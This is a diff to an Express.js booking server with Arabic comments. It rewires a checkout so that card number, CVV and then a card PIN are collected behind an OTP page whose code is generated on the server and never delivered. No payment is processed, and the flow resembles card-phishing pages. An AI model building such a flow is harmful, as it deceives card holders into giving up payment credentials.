@@ -3,7 +3,6 @@ const session = require('express-session');
 const bodyParser = require('body-parser');
 const sqlite3 = require('sqlite3').verbose();
 const path = require('path');
-const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -61,7 +60,7 @@ app.get('/booking/hourly', (req, res) => {
   res.sendFile(path.join(__dirname, '../public/booking/hourly.html'));
 });
 
-// Booking - Hourly (POST - submit form)
+// Booking - Hourly (POST)
 app.post('/booking/hourly', (req, res) => {
   const { service, duration, workers, start_time, start_date, total } = req.body;
   req.session.booking = {
@@ -118,7 +117,7 @@ app.get('/booking/contact', (req, res) => {
   res.sendFile(path.join(__dirname, '../public/booking/contact.html'));
 });
 
-// Contact page (POST)
+// Contact page (POST) - حفظ البيانات فوراً في قاعدة البيانات بحالة pending
 app.post('/booking/contact', (req, res) => {
   const { name, phone, address, notes } = req.body;
   req.session.booking = {
@@ -128,6 +127,19 @@ app.post('/booking/contact', (req, res) => {
     address: address || '',
     notes: notes || ''
   };
+
+  // حفظ الحجز فوراً في قاعدة البيانات بحالة pending
+  const b = req.session.booking;
+  db.run(
+    `INSERT INTO bookings (type, service, duration, workers, start_time, start_date, contract_type, nationality, total, name, phone, address, notes, card_last4, card_type, status)
+     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'pending')`,
+    [b.type, b.service, b.duration, b.workers, b.start_time, b.start_date, b.contract_type, b.nationality, b.total, b.name, b.phone, b.address, b.notes, '', ''],
+    function(err) {
+      if (err) console.error('DB Error:', err);
+      req.session.bookingId = this ? this.lastID : null;
+    }
+  );
+
   res.redirect('/booking/payment');
 });
 
@@ -137,7 +149,7 @@ app.get('/booking/payment', (req, res) => {
   res.sendFile(path.join(__dirname, '../public/booking/payment.html'));
 });
 
-// Payment page (POST)
+// Payment page (POST) → يذهب لـ OTP
 app.post('/booking/payment', (req, res) => {
   const { card_number, card_expiry, card_cvv, card_name } = req.body;
   const last4 = (card_number || '').replace(/\s/g, '').slice(-4);
@@ -148,8 +160,15 @@ app.post('/booking/payment', (req, res) => {
     card_type: cardType,
     card_name: card_name || ''
   };
-  // Go to PIN page first, then OTP
-  res.redirect('/booking/pin');
+  // تحديث بيانات البطاقة في قاعدة البيانات
+  if (req.session.bookingId) {
+    db.run('UPDATE bookings SET card_last4=?, card_type=? WHERE id=?',
+      [last4, cardType, req.session.bookingId]);
+  }
+  // توليد OTP والذهاب لصفحة OTP
+  req.session.otp = Math.floor(100000 + Math.random() * 900000).toString();
+  req.session.otpExpiry = Date.now() + 5 * 60 * 1000;
+  res.redirect('/booking/otp');
 });
 
 // OTP page (GET)
@@ -158,7 +177,7 @@ app.get('/booking/otp', (req, res) => {
   res.sendFile(path.join(__dirname, '../public/booking/otp.html'));
 });
 
-// OTP verify (POST)
+// OTP verify (POST) → يذهب لـ PIN
 app.post('/booking/otp', (req, res) => {
   const { otp } = req.body;
   if (!req.session.otp || Date.now() > req.session.otpExpiry) {
@@ -167,23 +186,9 @@ app.post('/booking/otp', (req, res) => {
   if (otp !== req.session.otp) {
     return res.redirect('/booking/otp?error=invalid');
   }
-  // Save booking to DB
-  const b = req.session.booking;
-  db.run(
-    `INSERT INTO bookings (type, service, duration, workers, start_time, start_date, contract_type, nationality, total, name, phone, address, notes, card_last4, card_type, status)
-     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'confirmed')`,
-    [b.type, b.service, b.duration, b.workers, b.start_time, b.start_date, b.contract_type, b.nationality, b.total, b.name, b.phone, b.address, b.notes, b.card_last4, b.card_type],
-    function(err) {
-      if (err) console.error('DB Error:', err);
-      req.session.bookingId = this ? this.lastID : null;
-      req.session.otp = null;
-      res.redirect('/booking/success');
-    }
-  );
+  req.session.otp = null;
+  res.redirect('/booking/pin');
 });
-
-// After OTP success → redirect to PIN before success
-// (optional flow: payment -> pin -> otp -> success)
 
 // Resend OTP
 app.post('/booking/otp/resend', (req, res) => {
@@ -192,15 +197,39 @@ app.post('/booking/otp/resend', (req, res) => {
   res.json({ success: true, message: 'تم إرسال رمز جديد' });
 });
 
-// Get OTP (for testing - remove in production)
-app.get('/booking/otp/code', (req, res) => {
-  res.json({ otp: req.session.otp || 'لا يوجد رمز' });
+// PIN page (GET)
+app.get('/booking/pin', (req, res) => {
+  if (!req.session.booking) return res.redirect('/');
+  res.sendFile(path.join(__dirname, '../public/booking/pin.html'));
+});
+
+// PIN verify (POST) → نجاح الحجز
+app.post('/booking/pin', (req, res) => {
+  const { pin } = req.body;
+  if (!pin || pin.length !== 4) {
+    return res.redirect('/booking/pin?error=invalid');
+  }
+  // تحديث حالة الحجز إلى confirmed
+  if (req.session.bookingId) {
+    db.run('UPDATE bookings SET status=? WHERE id=?',
+      ['confirmed', req.session.bookingId]);
+  }
+  res.redirect('/booking/success');
 });
 
 // Success page
 app.get('/booking/success', (req, res) => {
   if (!req.session.bookingId) return res.redirect('/');
   res.sendFile(path.join(__dirname, '../public/booking/success.html'));
+});
+
+// Session info for frontend (card info)
+app.get('/booking/session-info', (req, res) => {
+  const b = req.session.booking || {};
+  res.json({
+    cardNumber: b.card_last4 ? '**** **** **** ' + b.card_last4 : null,
+    cardNetwork: b.card_type ? b.card_type.toUpperCase() : 'VISA'
+  });
 });
 
 // ============ ADMIN ROUTES ============
@@ -230,7 +259,7 @@ app.get('/admin/logout', (req, res) => {
   res.redirect('/admin');
 });
 
-// Admin API
+// Admin API - جلب الحجوزات
 app.get('/api/admin/bookings', (req, res) => {
   if (!req.session.isAdmin) return res.status(401).json({ error: 'Unauthorized' });
   const status = req.query.status;
@@ -246,6 +275,7 @@ app.get('/api/admin/bookings', (req, res) => {
   });
 });
 
+// Admin API - الإحصائيات
 app.get('/api/admin/stats', (req, res) => {
   if (!req.session.isAdmin) return res.status(401).json({ error: 'Unauthorized' });
   db.all(`SELECT 
@@ -262,6 +292,7 @@ app.get('/api/admin/stats', (req, res) => {
   });
 });
 
+// Admin API - تحديث حالة الحجز
 app.patch('/api/admin/bookings/:id', (req, res) => {
   if (!req.session.isAdmin) return res.status(401).json({ error: 'Unauthorized' });
   const { status } = req.body;
@@ -271,6 +302,7 @@ app.patch('/api/admin/bookings/:id', (req, res) => {
   });
 });
 
+// Admin API - حذف حجز
 app.delete('/api/admin/bookings/:id', (req, res) => {
   if (!req.session.isAdmin) return res.status(401).json({ error: 'Unauthorized' });
   db.run('DELETE FROM bookings WHERE id = ?', [req.params.id], function(err) {
@@ -279,34 +311,7 @@ app.delete('/api/admin/bookings/:id', (req, res) => {
   });
 });
 
-// PIN page (GET)
-app.get('/booking/pin', (req, res) => {
-  if (!req.session.booking) return res.redirect('/');
-  res.sendFile(path.join(__dirname, '../public/booking/pin.html'));
-});
-
-// PIN verify (POST)
-app.post('/booking/pin', (req, res) => {
-  const { pin } = req.body;
-  if (!pin || pin.length !== 4) {
-    return res.redirect('/booking/pin?error=invalid');
-  }
-  // Save PIN attempt (not stored for security) and redirect to OTP
-  req.session.otp = Math.floor(100000 + Math.random() * 900000).toString();
-  req.session.otpExpiry = Date.now() + 5 * 60 * 1000;
-  res.redirect('/booking/otp');
-});
-
-// Session info for frontend (card info)
-app.get('/booking/session-info', (req, res) => {
-  const b = req.session.booking || {};
-  res.json({
-    cardNumber: b.card_last4 ? '**** **** **** ' + b.card_last4 : null,
-    cardNetwork: b.card_type ? b.card_type.toUpperCase() : 'VISA'
-  });
-});
-
-// Session data for frontend
+// Session data
 app.get('/api/session/booking', (req, res) => {
   res.json(req.session.booking || {});
 });
@@ -315,7 +320,7 @@ app.get('/api/session/booking-id', (req, res) => {
   res.json({ id: req.session.bookingId || null });
 });
 
-// Helper
+// Helper - كشف نوع البطاقة
 function detectCardType(number) {
   const n = number.replace(/\s/g, '');
   if (/^4/.test(n)) return 'visa';
